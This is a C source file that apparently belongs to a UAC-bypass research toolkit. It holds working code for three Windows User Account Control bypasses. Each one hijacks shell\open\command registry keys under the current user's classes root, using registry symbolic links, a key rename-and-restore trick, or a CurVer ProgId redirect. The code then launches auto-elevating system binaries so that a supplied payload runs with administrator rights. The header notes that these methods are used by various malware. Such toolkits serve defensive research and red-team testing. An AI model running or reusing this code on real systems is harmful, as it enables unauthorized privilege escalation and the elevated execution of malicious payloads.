/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2016 - 2023
*
*  TITLE:       SHELLSUP.C
*
*  VERSION:     3.65
*
*  DATE:        25 Sep 2023
*
*  Shell registry hijack autoelevation methods.
*
*  Used by various malware.
*
*  For description please visit original URL
*  https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
*  https://enigma0x3.net/2016/07/22/bypassing-uac-on-windows-10-using-disk-cleanup/
*  https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/
*  https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/
*  https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/
*  http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass
*  https://www.activecyber.us/1/post/2019/03/windows-uac-bypass.html
*  https://packetstormsecurity.com/files/155927/Microsoft-Windows-10-Local-Privilege-Escalation.html
*  https://v3ded.github.io/redteam/utilizing-programmatic-identifiers-progids-for-uac-bypasses
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

/*
* ucmxSetSlaveParams
*
* Purpose:
*
* Set slave key parameters.
*
*/
NTSTATUS ucmxSetSlaveParams(
    _In_ HANDLE KeyHandle,
    _In_ LPCWSTR Payload
)
{
    NTSTATUS ntStatus = STATUS_ACCESS_DENIED;
    SIZE_T sz;
    DWORD cbData, dummy;

    dummy = 0;
    cbData = 0;

    ntStatus = supRegWriteValue(KeyHandle,
        T_DELEGATEEXECUTE,
        REG_SZ,
        &dummy,
        cbData);

    if (NT_SUCCESS(ntStatus)) {

        //
        // Set "Default" value as our payload.
        //
        sz = (1 + _strlen(Payload)) * sizeof(WCHAR);

        ntStatus = supRegWriteValue(KeyHandle,
            NULL,
            REG_SZ,
            (PVOID)Payload,
            (ULONG)sz);

    }

    return ntStatus;
}

/*
* ucmxCreateSlaveKey
*
* Purpose:
*
* Create temporary key with all required values.
*
*/
NTSTATUS ucmxCreateSlaveKey(
    _In_ HANDLE RootKey,
    _In_ LPCWSTR Payload,
    _Inout_ LPWSTR SlaveKey //cch max MAX_PATH
)
{
    NTSTATUS ntStatus = STATUS_ACCESS_DENIED;
    GUID guidTemp;
    LPWSTR lpGuidKey = NULL;

    HKEY hKey;
    SIZE_T sz;

    do {

        if (CoCreateGuid(&guidTemp) != S_OK)
            break;

        if (StringFromCLSID(&guidTemp, &lpGuidKey) != S_OK)
            break;

        sz = (1 + _strlen(lpGuidKey)) * sizeof(WCHAR);

        _strncpy(SlaveKey, MAX_PATH, lpGuidKey, MAX_PATH);

        //
        // Slave key with data.
        //
        if (ERROR_SUCCESS == RegCreateKey(RootKey,
            lpGuidKey,
            &hKey))
        {
            ntStatus = ucmxSetSlaveParams(hKey, Payload);
            RegCloseKey(hKey);
        }

    } while (FALSE);

    CoTaskMemFree(lpGuidKey);

    return ntStatus;
}

/*
* ucmShellRegModMethod
*
* Purpose:
*
* Bypass UAC using various registry shell key modifications.
*
*/
NTSTATUS ucmShellRegModMethod(
    _In_ UCM_METHOD Method,
    LPCWSTR lpTargetKey,
    LPCWSTR lpszTargetApp,
    LPCWSTR lpszPayload
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
    BOOLEAN bSlaveCreated = FALSE;
    NTSTATUS ntStatus = STATUS_ACCESS_DENIED;

    HANDLE masterRootKey = NULL, classesKey = NULL, targetKey = NULL;
    OBJECT_ATTRIBUTES obja;
    UNICODE_STRING    usCurrentUser, usMasterKey, usSlaveKey;

    WCHAR szSlaveKey[MAX_PATH * 2];
    WCHAR szMasterKey[MAX_PATH * 2];
    WCHAR szClasses[MAX_PATH];
    WCHAR szBuffer[MAX_PATH * 2];

    SHELLEXECUTEINFO shinfo;

    LPWSTR lpSlaveNtKey = NULL;

    DWORD dummy;
    SIZE_T sz;
    UNICODE_STRING CmSymbolicLinkValue = RTL_CONSTANT_STRING(L"SymbolicLinkValue");
    HRESULT hr_init;


    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

    RtlSecureZeroMemory(&szSlaveKey, sizeof(szSlaveKey));

#ifndef _WIN64
    if (g_ctx->IsWow64) {
        ntStatus = supEnableDisableWow64Redirection(TRUE);
        if (!NT_SUCCESS(ntStatus))
            return ntStatus;
    }
#endif

    do {

        //
        // Remember current user reg name.
        //
        ntStatus = RtlFormatCurrentUserKeyPath(&usCurrentUser);
        if (!NT_SUCCESS(ntStatus))
            break;

        //
        // Open classes root.
        //
        ntStatus = supOpenClassesKey(&usCurrentUser, &classesKey);
        if (!NT_SUCCESS(ntStatus))
            break;

        //
        // Create slave key.
        //
        szSlaveKey[0] = L'\\';
        szSlaveKey[1] = 0;

        ntStatus = ucmxCreateSlaveKey(
            classesKey,
            lpszPayload,
            &szSlaveKey[1]);

        if (!NT_SUCCESS(ntStatus))
            break;

        bSlaveCreated = TRUE;

        //
        // Allocate slave NT regpath.
        //
        sz = (MAX_PATH + _strlen(szSlaveKey) * sizeof(WCHAR)) +
            usCurrentUser.MaximumLength;

        lpSlaveNtKey = (PWSTR)supHeapAlloc(sz);
        if (lpSlaveNtKey == NULL)
            break;

        RtlInitEmptyUnicodeString(&usSlaveKey, lpSlaveNtKey, sz);

        ntStatus = RtlAppendUnicodeStringToString(&usSlaveKey, &usCurrentUser);
        if (!NT_SUCCESS(ntStatus))
            break;

        szClasses[0] = L'\\';
        szClasses[1] = 0;
        _strcpy(&szClasses[1], T_SOFTWARE_CLASSES);
        ntStatus = RtlAppendUnicodeToString(&usSlaveKey, szClasses);
        if (!NT_SUCCESS(ntStatus))
            break;

        ntStatus = RtlAppendUnicodeToString(&usSlaveKey, szSlaveKey);
        if (!NT_SUCCESS(ntStatus))
            break;

        //
        // Create empty master key.
        //
        _strncpy(szMasterKey, MAX_PATH, lpTargetKey, MAX_PATH);
        _strcat(szMasterKey, T_SHELL_OPEN);

        if (ERROR_SUCCESS != RegCreateKeyEx(classesKey,
            szMasterKey,
            0,
            NULL,
            REG_OPTION_NON_VOLATILE,
            MAXIMUM_ALLOWED,
            NULL,
            (HKEY*)&masterRootKey,
            NULL))
        {
            break;
        }

        //
        // Open/create master key.
        //
        RtlInitUnicodeString(&usMasterKey, T_SHELL_COMMAND);
        InitializeObjectAttributes(&obja, &usMasterKey, OBJ_CASE_INSENSITIVE, masterRootKey, NULL);

        ntStatus = NtCreateKey(&targetKey,
            KEY_ALL_ACCESS,
            &obja, 0, NULL,
            REG_OPTION_CREATE_LINK | REG_OPTION_VOLATILE,
            &dummy);

        //
        // If link already created, update it.
        //
        if (ntStatus == STATUS_OBJECT_NAME_COLLISION) {

            obja.Attributes |= OBJ_OPENLINK;

            ntStatus = NtOpenKey(&targetKey,
                KEY_ALL_ACCESS,
                &obja);

        }

        if (!NT_SUCCESS(ntStatus))
            break;

        sz = _strlen(usSlaveKey.Buffer) * sizeof(WCHAR);

        ntStatus = NtSetValueKey(targetKey,
            &CmSymbolicLinkValue,
            0,
            REG_LINK,
            (PVOID)usSlaveKey.Buffer,
            (ULONG)usSlaveKey.Length);

        if (!NT_SUCCESS(ntStatus))
            break;

        NtClose(targetKey);
        targetKey = NULL;

        if ((Method == UacMethodShellChangePk) || (Method == UacMethodShellSdclt)) {

            _strcpy(szBuffer, g_ctx->szSystemDirectory);
            _strcat(szBuffer, lpszTargetApp);
            RtlSecureZeroMemory(&shinfo, sizeof(shinfo));
            shinfo.cbSize = sizeof(shinfo);
            shinfo.lpVerb = RUNAS_VERB;
            shinfo.lpFile = szBuffer;
            shinfo.nShow = SW_SHOWNORMAL;
            shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
            if (ShellExecuteEx(&shinfo)) {
                Sleep(5000);
                TerminateProcess(shinfo.hProcess, 0);
                CloseHandle(shinfo.hProcess);
                MethodResult = STATUS_SUCCESS;
            }

        }
        else {
            if (supRunProcess(lpszTargetApp, NULL))
                MethodResult = STATUS_SUCCESS;
        }

    } while (FALSE);

    if (targetKey) NtClose(targetKey);
    if (lpSlaveNtKey) supHeapFree(lpSlaveNtKey);

    //
    // Cleanup slave key.
    //
    if (bSlaveCreated) {
        if (classesKey) {
            RegDeleteKey(classesKey, &szSlaveKey[1]);//skip slash
        }
    }

    if (classesKey)
        NtClose(classesKey);

    if (SUCCEEDED(hr_init)) CoUninitialize();

    //
    // Remove symlink.
    //
    szMasterKey[0] = L'\\';
    szMasterKey[1] = 0;
    _strcpy(&szMasterKey[1], T_SOFTWARE_CLASSES);
    _strcat(szMasterKey, TEXT("\\"));
    _strcat(szMasterKey, lpTargetKey);
    _strcat(szMasterKey, T_SHELL_OPEN);
    _strcat(szMasterKey, TEXT("\\"));
    _strcat(szMasterKey, T_SHELL_COMMAND);
    supRemoveRegLinkHKCU(szMasterKey);

#ifndef _WIN64
    if (g_ctx->IsWow64) {
        supEnableDisableWow64Redirection(FALSE);
    }
#endif
    return MethodResult;
}

/*
* ucmShellRegModMethod2
*
* Purpose:
*
* Bypass UAC using various registry shell key modifications.
*
*/
NTSTATUS ucmShellRegModMethod2(
    _In_ UCM_METHOD Method,
    LPCWSTR lpTargetKey,
    LPCWSTR lpszTargetApp,
    LPCWSTR lpszPayload
)
{
    BOOLEAN bBackupAvailable = FALSE;
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED, ntStatus;
    HANDLE hClassesRoot, hSubKey = NULL;
    DWORD dwDisp = 0;
    WCHAR szKey[MAX_PATH];
    PWSTR pwszKey;

    UNREFERENCED_PARAMETER(Method);

#ifndef _WIN64
    if (g_ctx->IsWow64) {
        ntStatus = supEnableDisableWow64Redirection(TRUE);
        if (!NT_SUCCESS(ntStatus))
            return ntStatus;
    }
#endif

    do {

        ntStatus = supOpenClassesKey(NULL, &hClassesRoot);
        if (!NT_SUCCESS(ntStatus))
            break;

        RtlSecureZeroMemory(&szKey, sizeof(szKey));

        _strcpy(szKey, lpTargetKey);
        _strcat(szKey, T_SHELL_OPEN);
        _strcat(szKey, TEXT("\\"));
        _strcat(szKey, T_SHELL_COMMAND);

        //
        // If "command" key exist - backup it.
        //
        if (ERROR_SUCCESS == RegOpenKeyEx(hClassesRoot,
            szKey,
            0,
            MAXIMUM_ALLOWED,
            (HKEY*)&hSubKey))
        {
            RegCloseKey(hSubKey);
            bBackupAvailable = (RegRenameKey(hClassesRoot,
                szKey,
                MYSTERIOUSCUTETHING) == ERROR_SUCCESS);
        }

        _strcat(szKey, TEXT("~"));

        hSubKey = NULL;

        if (ERROR_SUCCESS != RegCreateKeyEx(hClassesRoot,
            szKey,
            0,
            NULL,
            REG_OPTION_NON_VOLATILE,
            MAXIMUM_ALLOWED,
            NULL,
            (HKEY*)&hSubKey,
            &dwDisp))
        {
            break;
        }

        ntStatus = ucmxSetSlaveParams(hSubKey, lpszPayload);
        if (!NT_SUCCESS(ntStatus))
            break;

        RegCloseKey(hSubKey);
        hSubKey = NULL;

        RegRenameKey(hClassesRoot, szKey, T_SHELL_COMMAND);

        if (supRunProcess(lpszTargetApp, NULL))
            MethodResult = STATUS_SUCCESS;

    } while (FALSE);

    if (hSubKey) RegCloseKey(hSubKey);

    //
    // Cleanup section.
    //

    _strcpy(szKey, lpTargetKey);
    _strcat(szKey, T_SHELL_OPEN);
    _strcat(szKey, TEXT("\\"));

    if (bBackupAvailable) {

        pwszKey = _strend(szKey);

        _strcat(szKey, T_SHELL_COMMAND);
        RegDeleteKey(hClassesRoot, szKey);
        *pwszKey = 0;

        _strcat(szKey, MYSTERIOUSCUTETHING);

        RegRenameKey(hClassesRoot,
            szKey,
            T_SHELL_COMMAND);
    }
    else {
        _strcat(szKey, T_SHELL_COMMAND);
        RegDeleteKey(hClassesRoot, szKey);
    }

    if (hClassesRoot) NtClose(hClassesRoot);


#ifndef _WIN64
    if (g_ctx->IsWow64) {
        supEnableDisableWow64Redirection(FALSE);
    }
#endif
    return MethodResult;
}

/*
* ucmShellRegModMethod3
*
* Purpose:
*
* Bypass UAC using registry shell key CurVer progId.
*
*/
NTSTATUS ucmShellRegModMethod3(
    LPCWSTR lpTargetKey,
    LPCWSTR lpszTargetApp,
    LPCWSTR lpszPayload
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
    HANDLE hClassesRoot, hSubKey = NULL;

    SIZE_T sz;
    WCHAR szKey[MAX_PATH];

#ifndef _WIN64
    if (g_ctx->IsWow64) {
        MethodResult = supEnableDisableWow64Redirection(TRUE);
        if (!NT_SUCCESS(MethodResult))
            return MethodResult;
    }
#endif

    do {

        MethodResult = supOpenClassesKey(NULL, &hClassesRoot);
        if (!NT_SUCCESS(MethodResult))
            break;

        RtlSecureZeroMemory(&szKey, sizeof(szKey));

        //
        // Prepare registry key for a new handler.
        //
        _strcpy(szKey, ABSOLUTEWIN);
        _strcat(szKey, T_SHELL_OPEN);
        _strcat(szKey, TEXT("\\"));
        _strcat(szKey, T_SHELL_COMMAND);

        if (ERROR_SUCCESS == RegCreateKeyEx(hClassesRoot, szKey, 0, NULL,
            REG_OPTION_NON_VOLATILE,
            MAXIMUM_ALLOWED,
            NULL,
            (HKEY*)&hSubKey,
            NULL))
        {
            sz = (1 + _strlen(lpszPayload)) * sizeof(WCHAR);

            MethodResult = supRegWriteValue(hSubKey,
                NULL,
                REG_SZ,
                (PVOID)lpszPayload,
                (DWORD)sz);


            RegCloseKey(hSubKey);
        }

        if (!NT_SUCCESS(MethodResult))
            break;

        //
        // Set CurVer to target key
        //
        hSubKey = NULL;
        _strcpy(szKey, lpTargetKey);
        _strcat(szKey, TEXT("\\"));
        _strcat(szKey, T_CURVER);

        if (ERROR_SUCCESS == RegCreateKeyEx(hClassesRoot, szKey, 0, NULL,
            REG_OPTION_NON_VOLATILE,
            MAXIMUM_ALLOWED,
            NULL,
            (HKEY*)&hSubKey,
            NULL))
        {
            sz = (1 + _strlen(ABSOLUTEWIN)) * sizeof(WCHAR);

            MethodResult = supRegWriteValue(hSubKey,
                NULL,
                REG_SZ,
                (PVOID)ABSOLUTEWIN,
                (DWORD)sz);

            if (NT_SUCCESS(MethodResult)) {

                if (supRunProcess(lpszTargetApp, NULL))
                    MethodResult = STATUS_SUCCESS;

            }

            RegCloseKey(hSubKey);

            RegDeleteKey(hClassesRoot, szKey);
        }

    } while (FALSE);

    supRegDeleteKeyRecursive(hClassesRoot, ABSOLUTEWIN);

    if (hClassesRoot) NtClose(hClassesRoot);



#ifndef _WIN64
    if (g_ctx->IsWow64) {
        supEnableDisableWow64Redirection(FALSE);
    }
#endif
    return MethodResult;
}
